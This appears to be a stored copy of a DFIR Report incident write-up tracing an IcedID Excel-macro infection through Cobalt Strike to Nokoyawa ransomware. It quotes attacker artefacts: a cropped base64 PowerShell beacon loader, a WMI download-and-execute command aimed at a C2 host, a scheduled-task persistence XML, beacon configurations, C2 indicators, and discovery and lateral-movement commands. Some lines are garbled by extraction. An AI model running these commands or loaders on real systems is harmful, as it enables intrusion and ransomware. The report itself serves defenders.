{
    "id": "af14885f-16d5-4c25-b17c-d6a38bbd6722",
    "created_at": "2023-06-05T02:06:31.398125Z",
    "updated_at": "2025-03-27T02:09:24.529573Z",
    "deleted_at": null,
    "sha1_hash": "468f8adaa251235678963c0828f45eb41a810a95",
    "title": "2023-05-22 - IcedID Macro Ends in Nokoyawa Ransomware",
    "authors": "",
    "file_creation_date": "2023-06-04T12:54:34Z",
    "file_modification_date": "2023-06-04T12:54:34Z",
    "file_size": 9443581,
    "plain_text": "# IcedID Macro Ends in Nokoyawa Ransomware\n\n**thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/**\n\nThreat actors have moved to other means of initial access, such as ISO files combined with LNKs or OneNote payloads, but some\nappearances of VBA macros in Office documents can still be seen in use.\n\n\nMay 22, 2023\n\n\n[In this case we document an incident taking place during Q4 of 2022 consisting of threat actors targeting Italian organizations with Excel](https://twitter.com/reecdeep/status/1577979717717721088?s=20&t=QWDIpjACeLzPOEy4DDGnUQ)\nmaldocs that deploy IcedID. The threat actors deploying such a campaign may hope to target organizations who have not updated their\n[Microsoft Office deployments after the newly released patches to block macros on documents downloaded from the internet.](https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked)\n\n[We have previously](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/) [reported on IcedID intrusions that have migrated to ISO files, however, this report is one of the most recent that will focus](https://thedfirreport.com/2022/04/25/quantum-ransomware/)\non the traditional Excel/macro intrusion vector.\n\nOnce inside, the threat actors pivoted using Cobalt Strike and RDP before a domain wide deployment of Nokoyawa ransomware with the help\n[of PsExec. Nokowaya ransomware is a family with ties to Karma/Nemty.](https://www.sentinelone.com/labs/nokoyawa-ransomware-new-karma-nemty-variant-wears-thin-disguise/)\n\n## Case Summary\n\nThis intrusion began with a malicious Excel document. We assess with medium-high confidence that this document was delivered as part of a\nmalicious email campaign during the first half of October 2022, based on public reporting that overlaps with multiple characteristics observed.\nUpon opening the Excel document, the macros would be executed when a user clicked on an embedded image. The macro code was\nresponsible for downloading and writing an IcedID DLL payload to disk. The macro then used a renamed rundll32 binary to execute the\nmalicious DLL.\n\nAfter reaching out to the initial command and control server, automated discovery ran from the IcedID process around two minutes after\n[execution. This discovery used the same suite of Microsoft binaries as we have previously](https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/) [reported for the IcedID malware family. At this time,](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/)\nthe malware also established persistence on the beachhead host using a scheduled task.\n\nAround two hours after the initial malware ran, IcedID loaded several Cobalt Strike beacons on the beachhead. Within minutes of running\nCobalt Strike on the beachhead the threat actors proceeded to elevate to SYSTEM permissions and dump LSASS memory using the beacons.\nFollowing this activity, the threat actors conducted further reconnaissance, and then moved laterally to a Domain Controller through the\nexecution of a Cobalt Strike payload via WMI.\n\nNext, discovery tasks continued from the beachhead host, including network scans for port 1433 (MSSQL) and browsing network shares with\nan interest in password files. The threat actors appeared to have removed some contents of the network shares off the network as canary files\nreport the documents being opened off network minutes later. After this, the threat actors remained quiet over the next several days.\n\nOn the fourth day, the threat actors returned briefly to execute a few commands on the Domain Controller related to the enumeration of domain\ncomputers and high privilege user account groups. Privilege escalation was also observed on the system via named pipe impersonation.\n\nEarly on the sixth day, the threat actors became active again launching the Edge browser on the beachhead host and appeared to download a\nfile from dropmefiles[.]com. But after completing this, they went silent again for around another eight hours. Then, from the beachhead host, a\nnew process was spawned from the IcedID malware; and from this shell, the threat actors began enumerating Active Directory using adget and\nAdFind.\n\nThe threat actors then began to spread laterally using a combination of Cobalt Strike beacon DLLs, batch scripts, and WMI commands. More\ncredential dumping was observed, followed by additional AdFind and other Windows discovery commands. The threat actors then continued\nlateral movement and began checking RDP access across the environment. A batch file was run enumerating hostnames throughout the\nenvironment using nslookup. Some further pivoting around systems and targeted discovery continued throughout the rest of the day.\n\nOn the seventh day, around 23 hours since the last activity in the environment the threat actors began the final phase of the intrusion. The\nthreat actors connected to a compromised server via RDP. From this server they would stage the ransomware deployment. They deployed the\nransomware payload, Sysinternals PsExec, and a cluster of batch files 1.bat-6.bat and p.bat. Opening a command prompt, they moved\nthrough executing the batch files copying p.bat, a renamed PsExec, and the ransomware payload to all domain joined hosts. They then used\nthe batch scripts to execute the ransomware payload via PsExec and WMI.\n\nThe time to ransomware (TTR) was around 148 hours (~6 days) from the initial infection. After the intrusion, contact was made with the threat\nactors using their support site and the price of the ransom was quoted around $200,000 USD in Bitcoin. No ransom was paid as a result of this\nintrusion.\n\n## Services\n\n[We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit,](https://thedfirreport.com/services/)\n[Empire PoshC2 etc More information on this service can be found here](https://thedfirreport.com/services/)\n\n\n-----\n\nOu te se ce c udes epo ts, e p o t e e ts, o g te ast uctu e t ac g, c uste g, C co gs, a d ot e cu ated te,\nincluding non-public case data.\n\n[We’ll be launching a private ruleset soon, if you’d like to get in at a discounted rate for the beta, please Contact Us.](https://thedfirreport.com/contact/)\n\n[If you are interested in hearing more about our services, or would like to talk about a free trial, please reach out using the Contact Us page. We](https://thedfirreport.com/contact/)\nlook forward to hearing from you.\n\n## Analysts\n\n[Analysis and reporting completed by @iiamaleks,](https://twitter.com/iiamaleks) [@MittenSec, &](https://twitter.com/MittenSec) [@0xtornado.](https://twitter.com/0xtornado)\n\n## MITRE ATT&CK\n\n Initial Access\n\nThis intrusion is linked to an IcedID malspam campaign that was observed in October 2022 targeting Italian organizations based on overlap in\nthe maldoc template and the IcedID C2 server.\n\n[https://twitter.com/reecdeep/status/1577979717717721088?s=20&t=QWDIpjACeLzPOEy4DDGnUQ](https://twitter.com/reecdeep/status/1577979717717721088?s=20&t=QWDIpjACeLzPOEy4DDGnUQ)\n\n\n-----\n\nThis case involved an IcedID payload delivered through an Excel maldoc containing VBA macros that were linked to the two images\nembedded in the document, which caused the macros to execute when a user clicks on either of the images:\n\n\n-----\n\nThe macro associated with the maldoc reached out to a hard-coded domain and downloaded the first stage IcedID payload. More on this in the\nnext section.\n\n\n-----\n\n## Execution\n\n### IcedID\n\nOnce the VBA macro was invoked, Excel connected to the hard-coded domain and downloaded the first stage of the IcedID payload.\n\nWhen the VBA macro from Excel calls out to the hard-coded domain, it has multiple interesting characteristics, including:\n\nTwo OPTIONS requests followed by a GET request.\nUser-agent fields mentioning Microsoft Office.\nSpecific HTTP headers such as X-Office-Major-Version, X-MSGETWEBURL, X-IDCRL_ACCEPTED, and UA-CPU.\n\nOnce the IcedID payload is successfully retrieved, it will be decoded with Base64 and written to disk. In this case, the payload was written to\nthe path retrieved from Application.DefaultFilePath, which is the default path used by Excel when it opens files.\n\nThe random name generated for the IcedID payload may be either 1 to 7 random digits, or 4500. This is because the Rnd function will return “a\nvalue less than 1 but greater than or equal to zero“.\n\n\n-----\n\nOnce the IcedID payload is successfully written to disk, the following post deployment steps are initiated:\n\nRundll32.exe is copied into a file named calc.exe under the path returned by Application.DefaultFilePath .\nCalc.exe (renamed rundll32.exe) is used to invoke the IcedID payload.\n\nIn this case, rundll32.exe was copied into the user Documents folder and named calc.exe. The name ‘calc.exe’ is hard-coded into the VBA\ncode and will not be changed.\n\n\n-----\n\nOnce the VBA macros invoked the IcedID payload, the parent-child process relationship between Excel and calc.exe was observed.\n\nThe following diagram provides a visual summary of the process to execute IcedID on the endpoint.\n\n### IcedID VNC\n\nThe threat actors were observed making use of an VNC module that was spawned by IcedID to spawn the Microsoft Edge browser:\n\nWe were able to reconstruct some of the VNC traffic thanks to [@0xThiebaut‘s tool](https://twitter.com/0xThiebaut) [PCAPeek. You can see the below options such as Edge,](https://github.com/0xThiebaut/PCAPeek/)\n[Chrome, Firefox, CMD, Task Manager and run dialog. Based on the visual it appears to be the KeyHole VNC module reported first observed in](https://blog.nviso.eu/2023/03/20/icedids-vnc-backdoors-dark-cat-anubis-keyhole/)\nOct 2022 by NVISO.\n\n\n-----\n\nIn another instance, a run dialog was observed being used to execute the calc.exe file that was created earlier. More information can be found\n[about this here.](https://twitter.com/DanielStepanic/status/1647342498132393984)\n\nHowever, the command below would have no effect in this case as calc.exe is a renamed version of rundll32 and no parameters were passed.\n\nSeveral other programs were seen run in this manner, as seen in process execution logs below:\n\n### Cobalt Strike\n\n\n-----\n\ne t eat acto s used Coba t St e beaco s t oug out t e t us o e st beaco as e ecuted a o e S e, c tu as\nexecuted initially by a command shell which was started by the IcedID malware at the same time a DLL beacon was also executed.\n\n[The downloaded PowerShell payload, previously hosted on hxxps://aicsoftware[.]com:757/coin, is available on VirusTotal. Here is the content](https://www.virustotal.com/gui/url/913510daabfab8551b7da3780ad9010ef31384c4e4975681c7d845b816e29c6b)\nof the payload, where we can observe an object being created in memory using an encoded string. We will walk through decoding this string to\nview the Cobalt Strike configuration present within.\n```\n$s=New-Object IO.MemoryStream(,\n[Convert]::FromBase64String(\"H4sIAAAAAAAA/9y969OySLIv+nnmr+gPK6K7g16tIqLuiBVxEBUQES94wdkTE6DIRZA7ivvs//1kVqGP79tvz8yOFfvLeSIMH6GoS1Z\n\n<---CROPPED_BASE64_CODE--->\n\n/Pj8+Pz4/Pj8+Pz4/Pj8+Pz4/Pj83/580/ff/rpD9tj9u3nP96//cu32j9/o//+aX/59sfrKvstOG7CX62jOFzw75r2/du//fSHP1RFf/nj/a900T/yn9Z3aq7Z+ukPf6OmZ\n (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n\n\n```\n[After initial Base64 decoding, we found the payload used the default Cobalt Strike XOR value of 35 which allows for the next step of decoding](https://decoded.avast.io/threatintel/decoding-cobalt-strike-understanding-payloads/)\nthe payload\n\n\n-----\n\nSeco d stage decod g\n\n[After this an MZ header can be observed. From there, the data can be saved and reviewed using 1768.py from](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py) [Didier Stevens, revealing the](https://twitter.com/didierstevens)\nCobalt Strike configuration embedded within:\n\nThe full configuration:\n\n\n-----\n\n```\n0x0001 payload type           0x0001 0x0002 8 windows-beacon_https-reverse_https\n\n0x0002 port               0x0001 0x0002 757\n\n0x0003 sleeptime            0x0002 0x0004 62518\n\n0x0004 maxgetsize            0x0002 0x0004 1864736\n\n0x0005 jitter              0x0001 0x0002 37\n\n0x0007 publickey            0x0003 0x0100\n30819f302e06092a864886f72e010101050003818d00308189028181009380b188bdba677c26ff8adc2fd5bde97d595fccaa7b389be52c2c76d5bad1537105f105e3\n\n0x0008 server,get-uri          0x0003 0x0100 'aicsoftware\\rcom,/templates'\n\n0x000e SpawnTo             0x0003 0x0010 (NULL ...)\n\n0x001d spawnto_x86           0x0003 0x0040 '%windir%\\\\syswow64\\\\regsvr32\\rexe'\n\n0x001e spawnto_x64           0x0003 0x0040 '%windir%\\\\sysnative\\\\regsvr32\\rexe'\n\n0x001f CryptoScheme           0x0001 0x0002 0\n\n0x001a get-verb             0x0003 0x0010 'GET'\n\n0x001b post-verb            0x0003 0x0010 'POST'\n\n0x001c HttpPostChunk          0x0002 0x0004 0\n\n0x0025 license-id            0x0002 0x0004 305419776\n\n0x0026 bStageCleanup          0x0001 0x0002 1\n\n0x0027 bCFGCaution           0x0001 0x0002 0\n\n0x0009 useragent            0x0003 0x0100 'Mozilla/5\\r0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601\\r3\\r9\n(KHTML, like Gecko) Version/9\\r0\\r2 Safari/601\\r3\\r9'\n\n0x000a post-uri             0x0003 0x0040 '/favicon'\n\n0x000b Malleable_C2_Instructions    0x0003 0x0100\n\n Transform Input: [7:Input,4,2:600,3,46]\n\n  Print\n\n  Remove 600 bytes from begin\n\n  BASE64\n\n  Unknown instruction: 0x2e\n\n0x000c http_get_header         0x0003 0x0200\n\ncomonst_host_header Host: aicsoftware\n\n Const_header Connection: close\n\n Build Metadata: [7:Metadata,46,3,2:wordpress_logged_in=,6:Cookie,9:mark=true]\n\n  Unknown instruction: 0x2e\n\n  BASE64\n\n  Prepend wordpress_logged_in=\n\n  Header Cookie\n\n  Const_parameter mark=true\n\n0x002e process-inject-transform-x86   0x0003 0x0200 '\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x15Host:\naicsoftware\\rcom\\x00\\x00\\x00\\n\\x00\\x00\\x00\\x11Connection: close\\x00\\x00\\x00\\n\\x00\\x00\\x00/Content-Type: application/x-www-formurlencoded\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x0b\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x04yes=\\x00\\x00\\x00\\x04\\x00\\x\n\n0x0036 HostHeader            0x0003 0x0080 (NULL ...)\n\n0x0032 UsesCookies           0x0001 0x0002 1\n\n0x0023 proxy_type            0x0001 0x0002 2 IE settings\n\n0x003a TCP_FRAME_HEADER         0x0003 0x0080 '\\x00\\x04'\n\n0x0039 SMB_FRAME_HEADER         0x0003 0x0080 '\\x00\\x04'\n\n0x0037 EXIT_FUNK            0x0001 0x0002 0\n\n0x0028 killdate             0x0002 0x0004 0\n\n0x0029 textSectionEnd          0x0002 0x0004 177872\n\n0x002a feSectionsInfo      0x0003 0x0028 '\\x00À\\x02\\x00r¸\\x03\\x00\\x00À\\x03\\x00\\x88\\x85\\x04\\x00\\x00\\x90\\x04\\x004°\n\\x04\\x00\\x00À\\x04\\x00^Ï\\x04'\n\n0x002b process-inject-start-rwx     0x0001 0x0002 4 PAGE_READWRITE\n\n0x002c process-inject-use-rwx      0x0001 0x0002 32 PAGE_EXECUTE_READ\n\n0x002d process-inject-min_alloc     0x0002 0x0004 6133\n\n0x000d http_post_header         0x0003 0x0100\n\n Header ��\n0x002f process-inject-transform-x64   0x0003 0x0100 '\\x00\\x00\\x00\\x06\\x90\\x90\\x90\\x90\\x90\\x90'\n\n0x0035 process-inject-stub       0x0003 0x0010 'µJþ\\x01ìjuíó^\\x1aDø½9)'\n\n0x0033 process-inject-execute      0x0003 0x0080 '\\x01\\x04\\x03'\n\n0x0034 process-inject-allocation-method 0x0001 0x0002 0\n\n0x0000\n\nGuessing Cobalt Strike version: 4.2 (max 0x003a)\n\nSanity check Cobalt Strike config: OK\n\n```\nAfter using PowerShell beacons during the first day on the beachhead host and a Domain Controller, the threat actors moved to using DLL\nfiles exclusively for the remainder of Cobalt Strike beacons deployed during the intrusion. Other notable executions included the use of batch\nfiles:\n```\nC:\\Windows\\system32\\cmd.exe /c c:\\windows\\temp\\1.bat\n\n-> rundll32.exe c:\\windows\\temp\\1.dll, DllRegisterServer\n\n\n## Persistence\n\n```\nDuring the initial execution of IcedID, the following two files were created under the AppData Roaming folder of the user that executed it:\n\n**exdudipo.dll: IcedID first stage.**\n\n\n-----\n\n**ce se dat** coded e s o o t e seco d stage c t e st stage oad to e o y\n\nA scheduled task was created that contained instructions on executing the IcedID DLL and the location of the license.dat file. This is a very\ncommon method that IcedID has used for persistence.\n```\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n\n <RegistrationInfo>\n\n  <URI>\\{3774AD25-8218-8099-89BA-CE96C6E9DC4E}</URI>\n\n </RegistrationInfo>\n\n <Triggers>\n\n  <TimeTrigger id=\"TimeTrigger\">\n\n   <Repetition>\n\n    <Interval>PT1H</Interval>\n\n    <StopAtDurationEnd>false</StopAtDurationEnd>\n\n   </Repetition>\n\n   <StartBoundary>2012-01-01T12:00:00</StartBoundary>\n\n   <Enabled>true</Enabled>\n\n  </TimeTrigger>\n\n  <LogonTrigger id=\"LogonTrigger\">\n\n   <Enabled>true</Enabled>\n\n   <UserId>[REDACTED USER]</UserId>\n\n  </LogonTrigger>\n\n </Triggers>\n\n <Principals>\n\n  <Principal id=\"Author\">\n\n   <RunLevel>HighestAvailable</RunLevel>\n\n   <UserId>[REDACTED DOMAIN]\\[REDACTED USER]</UserId>\n\n   <LogonType>InteractiveToken</LogonType>\n\n  </Principal>\n\n </Principals>\n\n <Settings>\n\n  <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n\n  <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n\n  <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n\n  <AllowHardTerminate>false</AllowHardTerminate>\n\n  <StartWhenAvailable>true</StartWhenAvailable>\n\n  <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n\n  <IdleSettings>\n\n   <Duration>PT10M</Duration>\n\n   <WaitTimeout>PT1H</WaitTimeout>\n\n   <StopOnIdleEnd>true</StopOnIdleEnd>\n\n   <RestartOnIdle>false</RestartOnIdle>\n\n  </IdleSettings>\n\n  <AllowStartOnDemand>true</AllowStartOnDemand>\n\n  <Enabled>true</Enabled>\n\n  <Hidden>false</Hidden>\n\n  <RunOnlyIfIdle>false</RunOnlyIfIdle>\n\n  <WakeToRun>false</WakeToRun>\n\n  <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n\n  <Priority>7</Priority>\n\n </Settings>\n\n <Actions Context=\"Author\">\n\n  <Exec>\n\n   <Command>rundll32.exe</Command>\n\n   <Arguments>\"C:\\Users\\[REDACTED USER]\\AppData\\Roaming\\{02959BFD-29E0-6A95-3B77-5E55B8D01CB7}\\{CA2AB541-E118-83C2-ADAD8729FDCA00C0}\\exdudipo.dll\",#1 --pa=\"AntiquePeanut\\license.dat\"</Arguments>\n\n  </Exec>\n\n </Actions>\n\n</Task>\n\n\n```\nThe scheduled task was configured to execute every hour.\n\n\n-----\n\n## Privilege Escalation\n\nPrivilege escalation was completed on two systems via the named pipe GetSystem feature within the Cobalt Strike tool. An example is shown\nbelow via Sysmon event ID 1 – ProcessCreate Rule:\n\n## Defense Evasion\n\nThis intrusion displayed numerous techniques used by threat actors to evade detection.\n\n### Process Injection\n\nThe adversary was seen injecting code into legitimate processes via CreateRemoteThread which can be detected using Sysmon event ID 8.\n\n[The table below shows examples of injected processes found via an in memory yara scan using this Malpedia yara rule:](https://malpedia.caad.fkie.fraunhofer.de/details/win.cobalt_strike)\n\n\nHost Process\nID\n\n\nProcessName CommandLine\n\n\nworkstation.domain.local 612 winlogon.exe winlogon.exe\n\nworkstation.domain.local 828 svchost.exe C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p\n\nfileshare.domain.local 760 svchost.exe C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p\n\nfileshare.domain.local 4928 winlogon.exe winlogon.exe\n\nfileshare.domain.local 1960 rundll32.exe rundll32.exe c:\\windows\\temp\\1.dll\n\nbeachhead.domain.local 712 lsass.exe C:\\Windows\\system32\\lsass.exe\n\nbeachhead.domain.local 812 svchost.exe C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService\n\nbeachhead.domain.local 5884 TextInputHost.exe C:\\Windows\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\TextInputHos\n-ServerName:InputApp.AppXjd5de1g66v206tj52m9d0dtpppx4cgpn.mca\n\nbeachhead.domain.local 2036 sysmon64.exe C:\\Windows\\sysmon64.exe -z syscliprpc9E7B7D3FAF371803\n\n\n-----\n\nbeachhead.domain.local 2568 regsvr32.exe C:\\Windows\\syswow64\\regsvr32.exe\n\nbeachhead.domain.local 9760 cmd.exe C:\\Windows\\SysWOW64\\cmd.exe\n\nserver.domain.local 432 rundll32.exe rundll32.exe 1.dll\n\n### File Deletion\n\nFiles that were dropped in temporary directories were deleted after execution as seen below with Sysmon event ID 11 and 23.\n\nBelow is the list of files seen being created and later deleted by the threat actor:\n```\n7.exe\n\nadfind.bat\n\nadfind.exe\n\nadget.exe\n\nad.7z\n\n1.bat\n\n1.dll\n\n7.exe\n\nns.bat\n\n\n### Renamed System Utilities\n\n```\nAdversaries typically rename common Windows system utilities to avoid triggering alerts that monitor utility usage. The table below summaries\nthe renamed utilities observed in this intrusion.\n\nWindows Utility Renamed Windows Utility\n\nrundll32.exe C:\\Users\\<REDACTED>\\Documents\\calc.exe\n\npsexesvc.exe C:\\Windows\\mstdc.exe\n\n## Credential Access\n\nThe threat actors were observed accessing a file server, and browsing though files related to passwords. These would later be observed\nopened off network, more details in the exfiltration section on that activity.\n\nOn the second day of the intrusion, after moving laterally to a Domain Controller, LSASS was accessed from a Cobalt Strike process. The\n[access granted value 0x1010 was observed. As noted in a previous report, this value matches known mimikatz access patterns. This logged](https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/)\nevent suggests Cobalt Strike accessed LSASS to dump credentials from memory. This activity was observed again on various hosts on the\nfourth and sixth days of the intrusion.\n\n\n-----\n\n## Discovery\n\nThe discovery phase primarily utilized built-in Windows tools. One utility seen was chcp which allows you to display or set the code page\nnumber. The default chcp value is determined by the Windows locale. The locale can indicate the language, country, and regional standards of\nthat host (e.g. date and time formatting). After viewing the default page code, the adversary did change the value to 65001 to reflect the UTF-8\n[character set. We have seen this as a technique employed by IcedID for some time as reported in depth in prior cases.](https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/)\n```\narp -a\n\nchcp >&2\n\nchcp 65001\n\nchcp 65001 && c: && cd c:\\\n\ndir \\\\<REDACTED>\\c$\n\nipconfig /all\n\nnet config workstation\n\nnet group \"Domain Admins\" /domain\n\nnet group \"Domain Computers\" /domain\n\nnet group \"domain admins\" /dom\n\nnet group \"enterprise admins\" /dom\n\nnet localgroup \"administrators\" /dom\n\nnet view /all\n\nnet view /all /domain\n\nnet1 config workstation\n\nnltest /domain_trusts\n\nnltest /domain_trusts /all_trusts\n\nping <HOST_IP>\n\nsysteminfo\n\nwhoami\n\nwhoami /upn\n\n\n```\nFollowing the initial discovery commands mentioned above on day one, the threat actor scanned the network for port 1433, the default port\nused by Microsoft SQL server.\n\n\n-----\n\nThe discovery phase remained minimal leading into day six. The threat actors were seen dropping AdFind and adget.exe to reveal all users,\ngroups, computers, organizational units, subnets, and trust objects within the domain.\n```\nadfind.exe -gcb -sc trustdmp\n\nadfind.exe -f (objectcategory=group)\n\nadfind.exe -subnets -f (objectCategory=subnet)\n\nadfind.exe -f (objectcategory=organizationalUnit)\n\nadfind.exe -f objectcategory=computer\n\nadfind.exe -f (objectcategory=person)\n\n\n```\n[Adget is a newer tool that we first observed in this previous report but generally this tool performs similar AD discovery as AdFind.](https://thedfirreport.com/2023/04/03/malicious-iso-file-leads-to-domain-wide-ransomware/)\n\n\n-----\n\nFollowing the Active Directory discovery activity, additional remote discovery actions were observed using WMI to gather information about\nWindows OS version and licensing on the hosts.\n```\nC:\\Windows\\system32\\cmd.exe /C wmic /node:\"REDACTED\" /user:\"USER\" /password:\"REDACTED\" os get caption\n\n\n```\nThen another recon round occurred using NSLOOKUP to map assets to IP addresses.\n\nThis was followed by network scans for RDP:\n\n\n-----\n\n## Lateral Movement\n\nDuring this intrusion, threat actors used a number of different techniques to move laterally across the domain. The techniques used will be\ndetailed in the following sections.\n\n### T1021.006 Remote Services: WinRM\n\nSome of the threat actors’ lateral activity was executed using WinRM, this could be observed by matching parent-child process trees and DCE\nRPC traffic.\n\n### T1047 WMI\n\nThreat Actors ran the following command to download and execute an in memory PowerShell payload on a domain controller:\n```\nC:\\\\Windows\\\\System32\\\\wbem\\\\wmic.exe /node:REDACTED process call create \\\"\"cmd.exe /c powershell.exe -nop -w hidden -c \\\"\"\\\"\"IEX\n((new-object net.webclient).downloadstring('https://aicsoftware[.]com:757/coin'))\\\"\"\\\"\"\"\n\n\n```\nWMI was also used also when executing remote DLL beacons:\n```\nC:\\Windows\\system32\\cmd.exe /C wmic /node:\"REDACTED\" process call create \"c:\\windows\\system32\\rundll32.exe c:\\windows\\temp\\1.dll,\nDllRegisterServer\n\n\n```\nWMI commands were also observed during ransom deployment:\n```\nwmic /node:REDACTED /user:DOMAIN\\USER /password:REDACTED process call create cmd.exe /c copy \\\\REDACTED\\c$\\windows\\temp\\p.bat\nc:\\windows\\temp\n\n\n### T1021.002 Remote Services: SMB/Windows Admin Shares\n\n```\nThe threat actors relied on SMB to move their tools throughout the network during the intrusion.\n\n\n-----\n\nThe threat actors used PSExec to move laterally to servers during the ransom execution, the -r flag was used to rename the binary created on\nthe remote server to mstdc.exe.\n\n\n-----\n\nBelow are some of the PsExec forensic artifacts logged in Windows Event Logs and Sysmon:\n\n\n-----\n\nOverview of the mstdc.exe binary (renamed psexecsvc.exe):\n\nRenaming PsExec is likely an action taken by threat actors to bypass basic PsExec anomaly rules. However, there are Sigma rules which\n[detect this specific technique, as shared by Florian Roth back in 2019.](https://twitter.com/cyb3rops/status/1130747925242482688)\n\nThey also employed use of the Windows copy utility to move files around the network via SMB:\n```\ncmd.exe /c copy \\\\REDACTED\\c$\\windows\\temp\\p.bat c:\\windows\\temp\\\n\n\n### T1021.001 Remote Services: RDP\n\n```\nThreat actors also used RDP during this intrusion. Below is an example of forensic artifacts left after using RDP to move laterally from the\nbeachhead to one of the domain servers logged in Windows Event Logs using different providers:\n\n\n-----\n\n## Collection\n\nDuring discovery actions, the threat actors were observed using 7-Zip to archive data collected from active directory using AdFind.\n```\n7.exe a -mx3 ad.7z ad_*\n\n\n## Command and Control\n\n### IcedID\n\n```\nIn this case IcedID was observed with the campaign ID of 3298576311 communicating with a C2 server located at kicknocisd[.]com.\n\n**Suricata Rule Name** **Domain** **IP** **AS ORG** **Country**\n\nET MALWARE Win32/IcedID Request Cookie kicknocisd[.]com 159.65.169[.]200 DIGITALOCEAN-ASN United States\n\nAfter initial connections, IcedID command and control traffic moved to the following servers.\n\nDomain IP Port JA3 JA3s\n\ncurabiebarristie[.]com 198.244.180.66 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc\n\nstayersa[.]art 198.244.180.66 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc\n\nguaracheza[.]pics 45.66.248.119 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc\n\nbelliecow[.]wiki 45.66.248.119 443 a0e9f5d64349fb13191bc781f81f42e1 ec74a5c51106f0419184d0dd08fb05bc\n\n\n-----\n\nCo ect o s to o e o t e ced se e s as obse ed e o y du ps o t e beac ead ost s e de ce s co s ste t t t e\nconnections to 45.66.248[.]119 observed from the renamed rundll32.exe that loaded the IcedID DLL during maldoc execution at the beginning\nof this case.\n\n### BackConnect VNC\n\nDuring the intrusion we also observed connections to a BackConnect VNC IP address. These connections were also spawned from the\nrunning IcedID process on the beachhead host.\n\nAlerts from [Lenny Hansson‘s ruleset fired on the traffic for the following alerts:](https://twitter.com/NetcowboyDK)\n\nSuricata Alert IP Port\n\nNF – Malware IcedID BackConnect – Wait Command 137.74.104.108 8080\n\nNF – Malware IcedID BackConnect – Start VNC command – 11 137.74.104.108 8080\n\nHere’s another look at the VNC GUI from the attackers standpoint.\n\nIn the execution section we covered utilities launched by the threat actors from the VNC activity.\n\n### Web Service\n\nOn the sixth day, the threat actors launched an Edge browser on the beachhead host, via VNC as described in the execution section, and\nconnected to the site dropmefiles[.]com a site that offers free file transfer services. Data connections from the Edge browser in the SRUMDB\nindicate that a file download occurred but we were unable to determine what the file was or its purpose related to the intrusion.\n\n\n-----\n\n### Cobalt Strike\n\n**T1071 / S0154**\n\nThe threat actors dropped and executed a malicious DLL, p1.dll, on the beachhead. This malicious DLL is a Cobalt Strike beacon reaching out\nto 23.29.115.152/aicsoftware[.]com on ports 757 and 8080. Later the threat actors also injected further beacons into memory reaching out to\n50.3.132.232 /iconnectgs[.]com on port 8081. Later on day six, the threat actors added a new Cobalt Strike server to the intrusion, 5.8.18.242\non port 443 (see below for visualizing this activity).\n\n### Beaconing\n\nBelow is a screenshot of a packet captured from C2 traffic over HTTP. Encrypted POST requests made to iconnectgs[.]com (50.3.132[.]232)\nare seen:\n\n\n-----\n\n### Cobalt Strike Configurations\n\nDomain IP Port JA3 JA3s\n\naicsoftware[.]com 23.29.115.152 757 a0e9f5d64349fb13191bc781f81f42e1 f176ba63b4d68e576b5ba345bec2c7b7\n\naicsoftware[.]com 23.29.115.152 8080 N/A N/A\n\n\n-----\n\n```\n  \"beacontype\": [\n\n    \"HTTP\"\n\n  ],\n\n  \"sleeptime\": 62518,\n\n  \"jitter\": 37,\n\n  \"maxgetsize\": 1398708,\n\n  \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n\n  \"license_id\": 305419776,\n\n  \"cfg_caution\": false,\n\n  \"kill_date\": null,\n\n  \"server\": {\n\n    \"hostname\": \"aicsoftware.com\",\n\n    \"port\": 8080,\n\n    \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCTgLGIvbpnfCb/itwv1b3pfVlfzKp7OJvlLCx21brRU3EF8QXjMD8Dsp5t0wZjZ8WRRiSfkU5KoY2ARexF3Jbd3W4O243\n\n  },\n\n  \"host_header\": \"\",\n\n  \"useragent_header\": null,\n\n  \"http-get\": {\n\n    \"uri\": \"/br.js\",\n\n    \"verb\": \"GET\",\n\n    \"client\": {\n\n      \"headers\": null,\n\n      \"metadata\": null\n\n    },\n\n    \"server\": {\n\n      \"output\": [\n\n        \"print\",\n\n        \"prepend 600 characters\",\n\n        \"base64\",\n\n        \"mask\"\n\n      ]\n\n    }\n\n  },\n\n  \"http-post\": {\n\n    \"uri\": \"/es\",\n\n    \"verb\": \"POST\",\n\n    \"client\": {\n\n      \"headers\": null,\n\n      \"id\": null,\n\n      \"output\": null\n\n    }\n\n  },\n\n  